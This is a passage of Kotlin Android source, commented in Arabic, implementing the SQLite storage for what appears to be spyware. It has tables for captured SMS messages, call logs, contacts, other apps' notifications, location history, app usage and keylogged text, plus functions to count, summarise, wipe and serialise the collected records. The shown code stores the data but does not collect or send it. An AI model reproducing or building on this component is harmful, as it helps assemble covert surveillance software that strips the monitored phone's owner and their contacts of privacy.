                    "call_logs" to TABLE_CALL_LOGS,
                    "contacts" to TABLE_CONTACTS,
                    "notifications" to TABLE_NOTIFICATIONS,
                    "location" to TABLE_LOCATIONS,
                    "locations" to TABLE_LOCATIONS,
                    "events" to TABLE_DEVICE_EVENTS,
                    "device_events" to TABLE_DEVICE_EVENTS,
                    "app_usage" to TABLE_APP_USAGE,
                    "usage" to TABLE_APP_USAGE,
                    "keylog" to TABLE_KEYLOG,
                    "keylog_entries" to TABLE_KEYLOG
                )

                val tableName = validTables[table.lowercase()]
                if (tableName == null) {
                    Log.e(TAG, "اسم جدول غير صالح للمسح: $table")
                    return
                }

                val deleted = db.delete(tableName, null, null)
                Log.d(TAG, "تم مسح جميع البيانات من جدول [$tableName] - عدد السجلات المحذوفة: $deleted")

                // تشغيل VACUUM
                try {
                    db.execSQL("VACUUM;")
                } catch (e: Exception) {
                    Log.w(TAG, "تحذير: فشل تشغيل VACUUM: ${e.message}")
                }
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في مسح الجدول [$table]: ${e.message}", e)
            }
        }
    }

    /**
     * حذف جميع البيانات من جميع الجداول
     *
     * @param context سياق التطبيق
     */
    fun clearAllData(context: Context) {
        synchronized(lock) {
            try {
                val db = getWritableDb(context)
                Log.w(TAG, "بدء حذف جميع البيانات من قاعدة البيانات!")

                var totalDeleted = 0

                totalDeleted += db.delete(TABLE_SMS, null, null)
                totalDeleted += db.delete(TABLE_CALL_LOGS, null, null)
                totalDeleted += db.delete(TABLE_CONTACTS, null, null)
                totalDeleted += db.delete(TABLE_NOTIFICATIONS, null, null)
                totalDeleted += db.delete(TABLE_LOCATIONS, null, null)
                totalDeleted += db.delete(TABLE_DEVICE_EVENTS, null, null)
                totalDeleted += db.delete(TABLE_APP_USAGE, null, null)
                totalDeleted += db.delete(TABLE_KEYLOG, null, null)

                // إعادة تعيين معرفات AUTOINCREMENT
                db.execSQL("DELETE FROM sqlite_sequence WHERE name IN ('$TABLE_SMS', '$TABLE_CALL_LOGS', '$TABLE_CONTACTS', '$TABLE_NOTIFICATIONS', '$TABLE_LOCATIONS', '$TABLE_DEVICE_EVENTS', '$TABLE_APP_USAGE', '$TABLE_KEYLOG')")

                // تشغيل VACUUM لتحرير المساحة
                try {
                    db.execSQL("VACUUM;")
                    Log.d(TAG, "تم تشغيل VACUUM بعد حذف جميع البيانات")
                } catch (e: Exception) {
                    Log.w(TAG, "تحذير: فشل تشغيل VACUUM: ${e.message}")
                }

                Log.w(TAG, "تم حذف جميع البيانات بنجاح - إجمالي السجلات المحذوفة: $totalDeleted")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في حذف جميع البيانات: ${e.message}", e)
            }
        }
    }

    // ==================== ==================== ====================
    //          أوامر الأدوات - Utility Methods
    // ==================== ==================== ====================

    /**
     * الحصول على حجم ملف قاعدة البيانات بالبايت
     *
     * @param context سياق التطبيق
     * @return الحجم بالبايت
     */
    fun getDatabaseSize(context: Context): Long {
        synchronized(lock) {
            try {
                val dbFile = context.getDatabasePath(DATABASE_NAME)
                if (dbFile.exists()) {
                    val size = dbFile.length()
                    Log.d(TAG, "حجم قاعدة البيانات: ${formatFileSize(size)}")
                    return size
                }
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في الحصول على حجم قاعدة البيانات: ${e.message}", e)
            }
            return 0
        }
    }

    /**
     * الحصول على ملخص كامل لقاعدة البيانات
     * يُستخدم لعرض حالة التخزين في واجهة المستخدم
     *
     * @param context سياق التطبيق
     * @return خريطة تحتوي على إحصائيات قاعدة البيانات
     */
    fun getDatabaseSummary(context: Context): Map<String, Any> {
        synchronized(lock) {
            val summary = mutableMapOf<String, Any>()
            try {
                val dbSize = getDatabaseSize(context)

                summary["database_name"] = DATABASE_NAME
                summary["database_version"] = DATABASE_VERSION
                summary["database_size_bytes"] = dbSize
                summary["database_size_formatted"] = formatFileSize(dbSize)

                summary["sms_count"] = getSMSCount(context)
                summary["call_count"] = getCallCount(context)
                summary["contact_count"] = getContactCount(context)
                summary["notification_count"] = getNotificationCount(context)
                summary["location_count"] = getLocationCount(context)

                // عدد أحداث الجهاز
                val eventsCount = getCount(context, TABLE_DEVICE_EVENTS, "عدد أحداث الجهاز")
                summary["device_event_count"] = eventsCount

                // عدد سجلات التطبيقات
                val usageCount = getCount(context, TABLE_APP_USAGE, "عدد سجلات التطبيقات")
                summary["app_usage_count"] = usageCount

                // عدد سجلات لوحة المفاتيح
                val keylogCount = getCount(context, TABLE_KEYLOG, "عدد سجلات لوحة المفاتيح")
                summary["keylog_count"] = keylogCount

                // الإجمالي
                val totalRecords = summary.values.filterIsInstance<Int>().sum()
                summary["total_records"] = totalRecords

                Log.d(TAG, "ملخص قاعدة البيانات: $totalRecords سجل - الحجم: ${formatFileSize(dbSize)}")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في الحصول على ملخص قاعدة البيانات: ${e.message}", e)
            }
            return summary
        }
    }

    /**
     * إغلاق قاعدة البيانات وتحرير الموارد
     */
    fun close() {
        synchronized(lock) {
            try {
                // تشغيل VACUUM قبل الإغلاق
                dbHelper?.writableDatabase?.let { db ->
                    try {
                        db.execSQL("VACUUM;")
                        Log.d(TAG, "تم تشغيل VACUUM قبل إغلاق قاعدة البيانات")
                    } catch (e: Exception) {
                        Log.w(TAG, "تحذير: فشل VACUUM قبل الإغلاق: ${e.message}")
                    }
                    db.close()
                }
                dbHelper?.close()
                dbHelper = null
                Log.d(TAG, "تم إغلاق قاعدة البيانات وتحرير الموارد")
            } catch (e: Exception) {
                Log.e(TAG, "خطأ في إغلاق قاعدة البيانات: ${e.message}", e)
            }
        }
    }

    // ==================== ==================== ====================
    //          دوال مساعدة - Helper Functions
    // ==================== ==================== ====================

    /**
     * تحويل مؤشر SQLite إلى خريطة
     *
     * @param cursor مؤشر قاعدة البيانات
     * @return خريطة تحتوي على جميع الأعمدة والقيم
     */
    private fun cursorToMap(cursor: android.database.Cursor): Map<String, Any?> {
        val map = mutableMapOf<String, Any?>()
        val columnNames = cursor.columnNames
        for (name in columnNames) {
            val index = cursor.getColumnIndex(name)
            if (index >= 0) {
                when (cursor.getType(index)) {
                    android.database.Cursor.FIELD_TYPE_NULL -> map[name] = null
                    android.database.Cursor.FIELD_TYPE_INTEGER -> map[name] = cursor.getLong(index)
                    android.database.Cursor.FIELD_TYPE_FLOAT -> map[name] = cursor.getDouble(index)
                    android.database.Cursor.FIELD_TYPE_BLOB -> map[name] = cursor.getBlob(index)
                    else -> map[name] = cursor.getString(index)
                }
            }
        }
        return map
    }

    /**
     * تحويل خريطة إلى نص JSON بسيط (بدون مكتبة Gson)
     *
     * @param map الخريطة المراد تحويلها
     * @return نص JSON
     */
    private fun mapToJson(map: Map<String, Any?>): String {
        val builder = StringBuilder()
        builder.append("{")
        val entries = map.entries.toList()
        for ((i, entry) in entries.withIndex()) {
            if (i > 0) builder.append(", ")
            builder.append("\"${entry.key}\": ")
            val value = entry.value
            when (value) {
                null -> builder.append("null")
                is Number -> builder.append(value)
                is Boolean -> builder.append(value)
                is String -> builder.append("\"${escapeJson(value)}\"")
                is Map<*, *> -> {
                    @Suppress("UNCHECKED_CAST")
                    builder.append(mapToJson(value as Map<String, Any?>))
                }
                is List<*> -> {
                    builder.append(listToJson(value))
                }
                else -> builder.append("\"${escapeJson(value.toString())}\"")
            }
        }
        builder.append("}")
        return builder.toString()
    }

    /**
     * تحويل قائمة إلى نص JSON
     *
     * @param list القائمة المراد تحويلها
     * @return نص JSON
     */
    private fun listToJson(list: List<*>): String {
        val builder = StringBuilder()
        builder.append("[")
        for ((i, item) in list.withIndex()) {
            if (i > 0) builder.append(", ")
            when (item) {
                null -> builder.append("null")
                is Number -> builder.append(item)
                is Boolean -> builder.append(item)
                is String -> builder.append("\"${escapeJson(item)}\"")
                is Map<*, *> -> {
                    @Suppress("UNCHECKED_CAST")
                    builder.append(mapToJson(item as Map<String, Any?>))
                }
                else -> builder.append("\"${escapeJson(item.toString())}\"")
            }
        }
        builder.append("]")
        return builder.toString()
    }

    /**
     * تهريب الأحرف الخاصة في JSON
     *
     * @param text النص المراد تهريبه
     * @return النص المهرب
     */
    private fun escapeJson(text: String): String {
        return text
            .replace("\\", "\\\\")
            .replace("\"", "\\\"")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\t", "\\t")
    }

    /**
     * الحصول على التاريخ الحالي كنص مقروء
     *
     * @return التاريخ والوقت بتنسيق مقروء
     */
    private fun getCurrentReadableDate(): String {
        val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
        return formatter.format(Date())
    }

    /**
     * تنسيق الطابع الزمني كنص مقروء
     *
     * @param timestamp الطابع الزمني بالمللي ثانية
     * @return التاريخ والوقت المنسق
     */
    private fun formatTimestamp(timestamp: Long): String {
        val formatter = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US)
        return formatter.format(Date(timestamp))
    }

    /**
     * تنسيق حجم الملف كنص مقروء
     *
     * @param bytes الحجم بالبايت
     * @return النص المنسق (مثال: "2.5 MB")
     */
    private fun formatFileSize(bytes: Long): String {
        return when {
            bytes < 1024 -> "$bytes B"
            bytes < 1024 * 1024 -> String.format("%.1f KB", bytes / 1024.0)
            bytes < 1024 * 1024 * 1024 -> String.format("%.1f MB", bytes / (1024.0 * 1024.0))
            else -> String.format("%.1f GB", bytes / (1024.0 * 1024.0 * 1024.0))
        }
    }

    // ==================== ==================== ====================
    //          فئة مساعد قاعدة البيانات (Database Helper)
    // ==================== ==================== ====================

    /**
     * DatabaseHelper - فئة مساعدة لإنشاء وإدارة قاعدة بيانات SQLite
     * تنشئ جميع الجداول والفهارس عند التثبيت الأول
     */
    private class DatabaseHelper(context: Context) : SQLiteOpenHelper(
        context,
        DATABASE_NAME,
        null,
        DATABASE_VERSION
    ) {

        // ==================== ====================
        //          إنشاء الجداول (Create Tables)
        // ==================== ====================

        /**
         * إنشاء قاعدة البيانات لأول مرة
         * يتم إنشاء جميع الجداول والفهارس
         */
        override fun onCreate(db: SQLiteDatabase) {
            Log.d(TAG, "بدء إنشاء جداول قاعدة البيانات...")

            // تفعيل AUTO-VACUUM
            db.execSQL("PRAGMA auto_vacuum = FULL;")
            Log.d(TAG, "تم تفعيل AUTO-VACUUM")

            // إنشاء جدول الرسائل النصية
            db.execSQL("""
                CREATE TABLE IF NOT EXISTS $TABLE_SMS (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    phone TEXT NOT NULL DEFAULT '',
                    body TEXT NOT NULL DEFAULT '',
                    type TEXT NOT NULL DEFAULT 'inbox',
                    timestamp INTEGER NOT NULL DEFAULT 0,
                    date_readable TEXT NOT NULL DEFAULT '',
                    is_read INTEGER NOT NULL DEFAULT 0,
                    collected_at INTEGER NOT NULL DEFAULT 0
                )
            """.trimIndent())
            Log.d(TAG, "تم إنشاء جدول الرسائل النصية: $TABLE_SMS")

            // إنشاء جدول سجل المكالمات
            db.execSQL("""
                CREATE TABLE IF NOT EXISTS $TABLE_CALL_LOGS (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    phone TEXT NOT NULL DEFAULT '',
                    name TEXT NOT NULL DEFAULT '',
                    type TEXT NOT NULL DEFAULT 'incoming',
                    duration_seconds INTEGER NOT NULL DEFAULT 0,
                    duration_formatted TEXT NOT NULL DEFAULT '00:00',
                    timestamp INTEGER NOT NULL DEFAULT 0,
                    date_readable TEXT NOT NULL DEFAULT '',
                    collected_at INTEGER NOT NULL DEFAULT 0
                )
            """.trimIndent())
            Log.d(TAG, "تم إنشاء جدول سجل المكالمات: $TABLE_CALL_LOGS")

            // إنشاء جدول جهات الاتصال
            db.execSQL("""
                CREATE TABLE IF NOT EXISTS $TABLE_CONTACTS (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    name TEXT NOT NULL DEFAULT '',
                    phones TEXT NOT NULL DEFAULT '[]',
                    emails TEXT NOT NULL DEFAULT '[]',
                    contact_id TEXT NOT NULL DEFAULT '',
                    collected_at INTEGER NOT NULL DEFAULT 0
                )
            """.trimIndent())
            Log.d(TAG, "تم إنشاء جدول جهات الاتصال: $TABLE_CONTACTS")

            // إنشاء جدول الإشعارات
            db.execSQL("""
                CREATE TABLE IF NOT EXISTS $TABLE_NOTIFICATIONS (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    app_name TEXT NOT NULL DEFAULT '',
                    package_name TEXT NOT NULL DEFAULT '',
                    category TEXT NOT NULL DEFAULT 'notification',
                    title TEXT NOT NULL DEFAULT '',
                    body TEXT NOT NULL DEFAULT '',
                    timestamp INTEGER NOT NULL DEFAULT 0,
                    collected_at INTEGER NOT NULL DEFAULT 0
                )
            """.trimIndent())
            Log.d(TAG, "تم إنشاء جدول الإشعارات: $TABLE_NOTIFICATIONS")

            // إنشاء جدول المواقع الجغرافية
            db.execSQL("""
                CREATE TABLE IF NOT EXISTS $TABLE_LOCATIONS (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    latitude REAL NOT NULL DEFAULT 0.0,
                    longitude REAL NOT NULL DEFAULT 0.0,
                    accuracy REAL NOT NULL DEFAULT 0.0,
                    speed REAL NOT NULL DEFAULT 0.0,
                    altitude REAL NOT NULL DEFAULT 0.0,
                    address TEXT NOT NULL DEFAULT '',
                    timestamp INTEGER NOT NULL DEFAULT 0,
                    date_readable TEXT NOT NULL DEFAULT '',
                    collected_at INTEGER NOT NULL DEFAULT 0
                )
            """.trimIndent())
            Log.d(TAG, "تم إنشاء جدول المواقع: $TABLE_LOCATIONS")

            // إنشاء جدول أحداث الجهاز
            db.execSQL("""
                CREATE TABLE IF NOT EXISTS $TABLE_DEVICE_EVENTS (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    event_type TEXT NOT NULL DEFAULT '',
                    event_data TEXT NOT NULL DEFAULT '{}',
                    timestamp INTEGER NOT NULL DEFAULT 0,
                    collected_at INTEGER NOT NULL DEFAULT 0
                )
            """.trimIndent())
            Log.d(TAG, "تم إنشاء جدول أحداث الجهاز: $TABLE_DEVICE_EVENTS")

            // إنشاء جدول استخدام التطبيقات
            db.execSQL("""
                CREATE TABLE IF NOT EXISTS $TABLE_APP_USAGE (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    package_name TEXT NOT NULL DEFAULT '',
                    app_name TEXT NOT NULL DEFAULT '',
                    last_used TEXT NOT NULL DEFAULT '',
                    usage_time_ms INTEGER NOT NULL DEFAULT 0,
                    timestamp INTEGER NOT NULL DEFAULT 0
                )
            """.trimIndent())
            Log.d(TAG, "تم إنشاء جدول استخدام التطبيقات: $TABLE_APP_USAGE")

            // إنشاء جدول سجل لوحة المفاتيح
            db.execSQL("""
                CREATE TABLE IF NOT EXISTS $TABLE_KEYLOG (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    app_package TEXT NOT NULL DEFAULT '',
                    text TEXT NOT NULL DEFAULT '',
                    timestamp INTEGER NOT NULL DEFAULT 0
                )
            """.trimIndent())
            Log.d(TAG, "تم إنشاء جدول سجل لوحة المفاتيح: $TABLE_KEYLOG")

            // ==================== ====================
            //          إنشاء الفهارس (Create Indexes)
            // ==================== ====================

            // فهرس الطابع الزمني للرسائل النصية
            db.execSQL("CREATE INDEX IF NOT EXISTS idx_sms_timestamp ON $TABLE_SMS (timestamp DESC)")
            // فهرس رقم الهاتف للرسائل النصية
            db.execSQL("CREATE INDEX IF NOT EXISTS idx_sms_phone ON $TABLE_SMS (phone)")
            Log.d(TAG, "تم إنشاء فهارس جدول الرسائل النصية")

            // فهرس الطابع الزمني للمكالمات
            db.execSQL("CREATE INDEX IF NOT EXISTS idx_calls_timestamp ON $TABLE_CALL_LOGS (timestamp DESC)")
            // فهرس رقم الهاتف للمكالمات
            db.execSQL("CREATE INDEX IF NOT EXISTS idx_calls_phone ON $TABLE_CALL_LOGS (phone)")
            // فهرس نوع المكالمة
            db.execSQL("CREATE INDEX IF NOT EXISTS idx_calls_type ON $TABLE_CALL_LOGS (type)")
            Log.d(TAG, "تم إنشاء فهارس جدول المكالمات")

            // فهرس اسم جهة الاتصال
            db.execSQL("CREATE INDEX IF NOT EXISTS idx_contacts_name ON $TABLE_CONTACTS (name)")
            // فهرس معرف جهة الاتصال
            db.execSQL("CREATE INDEX IF NOT EXISTS idx_contacts_id ON $TABLE_CONTACTS (contact_id)")
            Log.d(TAG, "تم إنشاء فهارس جدول جهات الاتصال")

            // فهرس الطابع الزمني للإشعارات
            db.execSQL("CREATE INDEX IF NOT EXISTS idx_notifs_timestamp ON $TABLE_NOTIFICATIONS (timestamp DESC)")
            // فهرس اسم التطبيق للإشعارات
            db.execSQL("CREATE INDEX IF NOT EXISTS idx_notifs_app ON $TABLE_NOTIFICATIONS (app_name)")
            // فهرس الحزمة للإشعارات
            db.execSQL("CREATE INDEX IF NOT EXISTS idx_notifs_package ON $TABLE_NOTIFICATIONS (package_name)")
            // فهرس التصنيف للإشعارات
            db.execSQL("CREATE INDEX IF NOT EXISTS idx_notifs_category ON $TABLE_NOTIFICATIONS (category)")
            Log.d(TAG, "تم إنشاء فهارس جدول الإشعارات")

            // فهرس الطابع الزمني للمواقع
            db.execSQL("CREATE INDEX IF NOT EXISTS idx_locations_timestamp ON $TABLE_LOCATIONS (timestamp DESC)")
            Log.d(TAG, "تم إنشاء فهرس جدول المواقع")

            // فهرس الطابع الزمني لأحداث الجهاز
            db.execSQL("CREATE INDEX IF NOT EXISTS idx_events_timestamp ON $TABLE_DEVICE_EVENTS (timestamp DESC)")
            // فهرس نوع حدث الجهاز
            db.execSQL("CREATE INDEX IF NOT EXISTS idx_events_type ON $TABLE_DEVICE_EVENTS (event_type)")
            Log.d(TAG, "تم إنشاء فهارس جدول أحداث الجهاز")

            // فهرس الحزمة لاستخدام التطبيقات
            db.execSQL("CREATE INDEX IF NOT EXISTS idx_usage_package ON $TABLE_APP_USAGE (package_name)")
            Log.d(TAG, "تم إنشاء فهرس جدول استخدام التطبيقات")

            // فهرس الطابع الزمني للوحة المفاتيح
            db.execSQL("CREATE INDEX IF NOT EXISTS idx_keylog_timestamp ON $TABLE_KEYLOG (timestamp DESC)")
            // فهرس حزمة التطبيق للوحة المفاتيح
            db.execSQL("CREATE INDEX IF NOT EXISTS idx_keylog_package ON $TABLE_KEYLOG (app_package)")
            Log.d(TAG, "تم إنشاء فهارس جدول سجل لوحة المفاتيح")

            Log.d(TAG, "تم إنشاء جميع جداول وفهارس قاعدة البيانات بنجاح!")
        }

        /**
         * ترقية قاعدة البيانات عند تغيير الإصدار
         * يحافظ على البيانات القديمة قدر الإمكان
         */
        override fun onUpgrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
            Log.w(TAG, "ترقية قاعدة البيانات من الإصدار $oldVersion إلى $newVersion")

            // الترقية التدريجية - معالجة كل إصدار على حدة
            var currentVersion = oldVersion
            while (currentVersion < newVersion) {
                currentVersion++
                Log.d(TAG, "الترقية إلى الإصدار: $currentVersion")

                when (currentVersion) {
                    // هنا تُضاف الترقيات المستقبلية
                    // مثال:
                    // 2 -> db.execSQL("ALTER TABLE $TABLE_SMS ADD COLUMN thread_id TEXT DEFAULT ''")
                }
            }

            Log.d(TAG, "تم ترقية قاعدة البيانات بنجاح إلى الإصدار $newVersion")
        }

        /**
         * الترقية النزلية لقاعدة البيانات (إذا نُقص الإصدار)
         * يحذف جميع البيانات ويعيد الإنشاء
         */
        override fun onDowngrade(db: SQLiteDatabase, oldVersion: Int, newVersion: Int) {
            Log.w(TAG, "تنزيل قاعدة البيانات من الإصدار $oldVersion إلى $newVersion - سيتم حذف جميع البيانات")
            dropAllTables(db)
            onCreate(db)
        }

        /**
         * حذف جميع الجداول
         *
         * @param db قاعدة البيانات
         */
        private fun dropAllTables(db: SQLiteDatabase) {
            Log.w(TAG, "حذف جميع الجداول...")
            db.execSQL("DROP TABLE IF EXISTS $TABLE_SMS")
            db.execSQL("DROP TABLE IF EXISTS $TABLE_CALL_LOGS")
            db.execSQL("DROP TABLE IF EXISTS $TABLE_CONTACTS")
            db.execSQL("DROP TABLE IF EXISTS $TABLE_NOTIFICATIONS")
            db.execSQL("DROP TABLE IF EXISTS $TABLE_LOCATIONS")
            db.execSQL("DROP TABLE IF EXISTS $TABLE_DEVICE_EVENTS")
            db.execSQL("DROP TABLE IF EXISTS $TABLE_APP_USAGE")
            db.execSQL("DROP TABLE IF EXISTS $TABLE_KEYLOG")
            Log.d(TAG, "تم حذف جميع الجداول")
        }

        /**
         * عند فتح قاعدة البيانات
         */
        override fun onOpen(db: SQLiteDatabase) {
            super.onOpen(db)
            Log.d(TAG, "تم فتح قاعدة البيانات - الإصدار: $DATABASE_VERSION")
            // تفعيل تسريع الكتابة المتسلسلة (تحسين الأداء)
            if (!db.isReadOnly) {
                db.execSQL("PRAGMA journal_mode = WAL;")
                db.execSQL("PRAGMA synchronous = NORMAL;")
                Log.d(TAG, "تم تفعيل WAL و NORMAL synchronous لتحسين الأداء")
            }
        }
    }
}
